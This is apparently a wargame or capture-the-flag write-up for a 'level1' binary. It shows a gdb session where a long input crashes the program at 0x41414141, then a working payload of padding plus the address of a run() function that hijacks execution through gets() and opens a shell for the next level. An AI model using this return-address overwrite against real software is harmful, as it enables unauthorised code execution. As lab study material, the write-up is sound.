}
We can see the funtion gets() so we can do a buffer overflow

(gdb) run
Starting program: /home/user/level1/level1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

We have this when we try to go more than 64 caracteres and we see the program search to execute the instruction in 0x41414141 who doesn't exist that the segfault
But what we can do it's execute the function run who is at 0x08048444!

(echo $'\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x44\x84\x04\x08' && cat) | ./level1
for that we put A still we have the overflow after we put the adress \x44\x84\x04\x08 and we do cat for getting the shell open
and now we have the shell for level02
